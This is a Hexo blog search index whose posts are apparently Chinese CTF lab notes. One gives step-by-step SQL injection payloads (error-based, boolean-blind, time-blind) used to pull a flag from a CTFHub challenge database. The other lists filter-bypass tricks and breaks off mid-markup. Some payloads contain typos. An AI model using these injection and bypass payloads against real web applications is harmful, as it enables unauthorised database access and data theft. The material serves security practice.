<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>例题(手工注入)</title>
      <link href="/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
      <url>/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="例题-手工注入"><a href="#例题-手工注入" class="headerlink" title="例题(手工注入)"></a>例题(手工注入)</h1><h3 id="例题1：报错注入-ctfhub"><a href="#例题1：报错注入-ctfhub" class="headerlink" title="例题1：报错注入(ctfhub)"></a>例题1：报错注入(ctfhub)</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202120498-1691289107543-2.png" alt="image-20230714202120498"></p><p>报错注入：首先想到 <code>updatexml</code> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202501659-1691289107544-4.png" alt="image-20230714202501659"></p><p>此时查询到数据库名：sqli</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;sqli&quot;),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202632846-1691289107544-5.png" alt="image-20230714202632846"></p><p>查询到表名：flag 进而查询列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;flag&quot;),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202802542-1691289107543-1.png" alt="image-20230714202802542"></p><p>最后查询 列名为 flag 的信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202857595-1691289107544-3.png" alt="image-20230714202857595"></p><h3 id="例题2：布尔盲注-ctfhub"><a href="#例题2：布尔盲注-ctfhub" class="headerlink" title="例题2：布尔盲注(ctfhub)"></a>例题2：布尔盲注(ctfhub)</h3><blockquote><ol><li><code>substr(str,from,length)</code>:返回从下标为from截取长度为length的str子串。<strong>其中，首字符下标为1</strong></li><li><code>length(str)</code>:返回str串长度</li></ol></blockquote><p><strong>1. 首先  <code> 爆数据库名长度</code> 使用<code>length(database()) = i</code> 获取数据库名的长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">......</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210008799.png" alt="image-20230714210008799"></p><p><strong>2. 根据数据库名长度爆库名 使用 <code> substr(database(),i,1)</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘a’</span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘s’</span><br><span class="line">#query_success</span><br><span class="line">#库名第一个字符是s</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span>‘i’</span><br><span class="line">#query_success</span><br><span class="line">#库名第四个字符是i</span><br><span class="line"></span><br><span class="line">#库名是sqli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210628752.png" alt="image-20230714210628752"></p><p><strong>3. 获取数据库内的表数量，使用mysql的查询语句<code>select COUNT(*)</code>。同样，要一个1到无穷的循环</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli有<span class="number">2</span>张表</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714211308430.png" alt="image-20230714211308430"></p><p><strong>4. 使用<code>limit i ,1</code>限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第一张表表名长度为<span class="number">4</span></span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第二张表表名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#当前库sqli有两张表’news’和’flag‘，表名长度均为<span class="number">4</span></span><br></pre></td></tr></table></figure><p>表名长度爆表名<code>substr((select…limit i,1),j,1)</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;n&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第一张表表名第一个字符是n</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第二张表表名的第四个字符是g</span><br><span class="line"></span><br><span class="line">#当前库sqli有两张表’news‘和‘flag’</span><br></pre></td></tr></table></figure><ol start="6"><li>对表爆列数量</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure><ol start="7"><li>根据表名和列数量爆列名长度</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第一列列名长度为<span class="number">4</span></span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第二列列名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#当前库sqli表flag有两个列‘id’和‘flag’，列名长度为<span class="number">2</span>和<span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="8"><li>根据列名长度爆列名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span></span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第一列列名第一个字符为i</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;g&#x27;</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第二列列名第四个字符为g</span><br><span class="line"></span><br><span class="line">#当前库sqli表flag有两个列‘id’和‘flag’</span><br></pre></td></tr></table></figure><ol start="9"><li>根据列名爆数据</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>，<span class="number">1</span>)<span class="operator">=</span>“a”</span><br><span class="line">#query_error</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>，<span class="number">1</span>)<span class="operator">=</span>“c”</span><br><span class="line">#query_success</span><br><span class="line">#flag的第一个字符是c</span><br><span class="line">...</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),i，<span class="number">1</span>)<span class="operator">=</span>“&#125;”</span><br><span class="line">#query_success</span><br><span class="line">#flag的最后一个字符是&#125;</span><br><span class="line">#这里的j是计数变量j从<span class="number">1</span>自增<span class="number">1</span>得到的值</span><br><span class="line"></span><br><span class="line">#出循环即可得到flag</span><br></pre></td></tr></table></figure><h3 id="例题3：时间盲注-ctfhub"><a href="#例题3：时间盲注-ctfhub" class="headerlink" title="例题3：时间盲注(ctfhub)"></a>例题3：时间盲注(ctfhub)</h3><p>时间盲注和上一篇布尔盲注一样都是盲注，都需要借助<code>length</code>,<code>ascii</code>,<code>substr</code>这些神奇的函数来猜测各项信息。它们的差别是猜测成功的依据。</p><p>布尔盲注的话如果查询有结果，一般会有一个<code>success_flag</code>,比如在上一题里就会返回<code>query successfully</code>。</p><p>但是时间盲注不一样，它不光不给你查询的内容的回显，不给你报错信息，甚至连布尔盲注里的<code>success_flag</code>也不给。<br>时间盲注相当于自行创造出了一个<code>success_flag</code>，将查询成功的情况与查询失败的情况做了区分。</p><blockquote><p><code>substr(str,from,length)</code>:返回从下标为from截取长度为length的str子串。<strong>其中，首字符下标为1</strong></p></blockquote><ol><li>首先爆破数据库长度</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">4</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201555815.png" alt="image-20230717201555815"></p><ol start="2"><li>爆破数据库名字</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(s)<span class="operator">=</span><span class="number">115</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">113</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(q)<span class="operator">=</span><span class="number">113</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">108</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(l)<span class="operator">=</span><span class="number">108</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)ascii(i)<span class="operator">=</span><span class="number">105</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">不断调整ASCII码的范围逐渐得到数据库名称为sqli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201850243.png" alt="image-20230717201850243"></p><ol start="3"><li>爆破数据库中表的数量</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202031447.png" alt="image-20230717202031447"></p><ol start="4"><li>爆破数据库中的各表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line">  <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">110</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">  ascii(n)<span class="operator">=</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>秒后响应，说明第一张表的第一个字母为n</span><br><span class="line">依次得到表名为news</span><br><span class="line">limit i,<span class="number">1</span>  i 表示的即是第几张表</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line">  <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">102</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">  ascii(f)<span class="operator">=</span><span class="number">102</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>秒后响应，说明第二张表的第一个字母为f</span><br><span class="line">依次得到表名为flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202404932.png" alt="image-20230717202404932"></p><ol start="5"><li>爆破flag表的字段数</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ol start="6"><li>猜解字段名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">102</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">一样的套路，得到字段名为flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手工注入 </tag>
            
            <tag> 报错注入 </tag>
            
            <tag> 布尔盲注 </tag>
            
            <tag> 时间盲注 </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入绕过技巧</title>
      <link href="/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
      <url>/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入绕过技巧"><a href="#sql注入绕过技巧" class="headerlink" title="sql注入绕过技巧"></a>sql注入绕过技巧</h1><h2 id="1-绕过空格（注释符-，-a0）："><a href="#1-绕过空格（注释符-，-a0）：" class="headerlink" title="1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）："></a>1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）：</h2><p>　　<code>两个空格代替一个空格，用Tab代替空格，%a0=空格：</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">20</span> <span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="operator">%</span><span class="number">00</span> <span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure><p> 最基本的绕过方法，用注释替换空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  注释 */</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230719194920907.png" alt="image-20230719194920907"></p><p>使用浮点数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="2-括号绕过空格："><a href="#2-括号绕过空格：" class="headerlink" title="2.括号绕过空格："></a>2.括号绕过空格：</h2><p>　　如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">user</span>())<span class="keyword">from</span> dual <span class="keyword">where</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span><span class="operator">=</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>　　这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">and</span>(sleep(ascii(mid(database()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">109</span>))<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p>（from for属于逗号绕过下面会有）</p><p>　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p><h2 id="3-引号绕过（使用十六进制）"><a href="#3-引号绕过（使用十六进制）" class="headerlink" title="3.引号绕过（使用十六进制）"></a>3.引号绕过（使用十六进制）</h2><p>　　会使用到引号的地方一般是在最后的<code>where</code>子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight sql"><table><tr><td 